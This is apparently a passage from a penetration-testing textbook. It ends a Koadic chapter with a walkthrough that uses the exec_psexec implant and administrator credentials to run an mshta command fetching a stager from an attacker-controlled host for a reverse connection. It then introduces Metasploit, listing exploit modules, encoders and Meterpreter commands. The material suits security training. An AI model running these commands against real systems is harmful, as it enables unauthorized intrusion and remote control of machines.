### Accessing the RPC Server to Execute Remote Commands

The objective here is to access the Remote Procedure Call (RPC) server to execute remote commands that will initiate a reverse connection using MSHTA. For this, we can utilize the `exec_psexec` implant and set the command to:

```plaintext
mshta http://192.168.10.122:9999/fGLYN
```

This command will execute our stager on the target internal system.

#### Setting Up the Implant

1. **Use the `exec_psexec` implant:**
   ```plaintext
   use implant/pivot/exec_psexec
   ```

2. **Set the command:**
   ```plaintext
   set cmd "mshta http://192.168.10.122:9999/fGLYN"
   ```

3. **Provide the necessary credentials:**
   ```plaintext
   set smbuser administrator
   set smbpass 123456
   set zombie 1
   ```

4. **Run the implant:**
   ```plaintext
   run
   ```

From the output, you can see that the implant successfully executed the provided command, establishing the reverse connection.

#### Summary

In this chapter, we covered the following topics:

- **MSF Payload Creator (MSFPC):** We introduced MSFPC and the steps to install it. We also discussed the use of resource files (.rc) generated by MSFPC, different types of payload generation, and various modes for mass payload generation.
- **Koadic:** We introduced Koadic, a C3 server, its installation, and usage, along with the stages for performing post-exploitation.

#### Questions

1. Why use MSFPC when you can use msfvenom?
2. Should we expect new features in MSFPC?
3. Where can we use the loop and batch modes in a real-world scenario?
4. Is MSFPC already installed in Kali Linux?
5. Why use Koadic when you can use Empire and Metasploit?
6. There are not many modules (implants) in Koadic compared to Metasploit or Empire. Why is that?
7. What else can we use instead of these command-line tools?

#### Further Reading

For more information on the topics discussed, please visit the following links:

- **MSFvenom Payload Creator (MSFPC):**
  - [Simplify Payload Creation with MSFPC (MSFvenom Payload Creator)](https://null-byte.wonderhowto.com/how-to/simplify-payload-creation-with-msfpc-msfvenom-payload-creator-0180240/)
  - [MSFvenom Payload Creator (MSFPC) Installation and Usage](https://www.yeahhub.com/msfvenom-payload-creator-msfpc-installation-usage/)

- **Koadic:**
  - [Koadic GitHub Repository](https://github.com/zerosum0x0/koadic)
  - [Using Koadic: A Command and Control Toolkit for Windows Post-Exploitation](https://null-byte.wonderhowto.com/how-to/use-koadic-command-control-remote-access-toolkit-for-windows-post-exploitation-0181742/)
  - [Hunting for Koadic: A COM-based Rootkit](https://countercept.com/our-thinking/hunting-for-koadic-a-com-based-rootkit/)
  - [Koadic: An Advanced Windows JScript/VBScript RAT!](http://pentestit.com/koadic-advanced-windows-jscript-vbscript-rat/)
  - [Koadic, or COM Command & Control](https://www.peerlyst.com/posts/bsideslv-2017-koadic-c3-windows-com-command-and-control-framework-by-zerosum0x0-and-aleph_naught-zerosum0x0)

### Metasploit Basics

Metasploit is a widely used tool for penetration testing and exploitation. It was first released in 2003 by H.D. Moore and later ported to Ruby by 2007. In October 2009, Rapid7 acquired the Metasploit project and added commercial versions, Metasploit Express and Metasploit Pro.

#### Technical Requirements

- Metasploit Framework (MSF)
- PostgreSQL (PGSQL)
- Oracle Java 1.7 or later
- Armitage

#### Installing Metasploit

- **Windows and macOS:** Installers are available.
- **Linux:**
  ```bash
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
  ```

#### Running Metasploit

- Start the Metasploit console:
  ```bash
  msfconsole
  ```

- Update Metasploit:
  ```bash
  msfupdate
  ```

- View help and basic terminology:
  ```bash
  help
  ```

#### Auxiliaries

- List all auxiliaries:
  ```bash
  show auxiliary
  ```

- Example: Run an SMB version scan:
  ```bash
  use auxiliary/scanner/smb/smb_ms17_101
  show info
  show options
  set RHOSTS <target_IP>
  run
  ```

#### Exploits

- List all exploits:
  ```bash
  show exploits
  ```

- Example: Use an RCE exploit on HP Data Protector:
  ```bash
  search hp_dataprotector
  use exploit/windows/misc/hp_dataprotector_cmd_exec
  set RHOST <target_IP>
  run
  ```

#### Payloads

- Types of payloads:
  - **Singles:** Standalone payloads for simple tasks.
  - **Stagers:** Establish a connection and download stages.
  - **Stages:** Components providing additional features.
  - **Inline (non-staged):** Single exploit with full shellcode.
  - **Meterpreter:** Dynamic payload using DLL injection.
  - **PassiveX:** Uses ActiveX control for communication.
  - **NoNX:** Bypasses DEP protection.
  - **Ord:** Small, unstable payloads.
  - **IPv6:** Built for IPv6 hosts.
  - **Reflective DLL injection:** Injects payload into memory.

- List all payloads:
  ```bash
  show payloads
  ```

#### Encoders

- List all encoders:
  ```bash
  show encoders
  ```

- Example: Use the x86/shikata_ga_nai encoder:
  ```bash
  set Encoder x86/shikata_ga_nai
  ```

#### Meterpreter

- Basic Meterpreter commands:
  ```bash
  help
  pwd
  ls
  ps
  migrate <PID>
  ```

- Manage sessions:
  ```bash
  sessions
  sessions -i <session_ID>
  sessions -K
  sessions -C <command>
  ```

This chapter provides a comprehensive introduction to Metasploit and its key components, setting the stage for more advanced topics in subsequent chapters.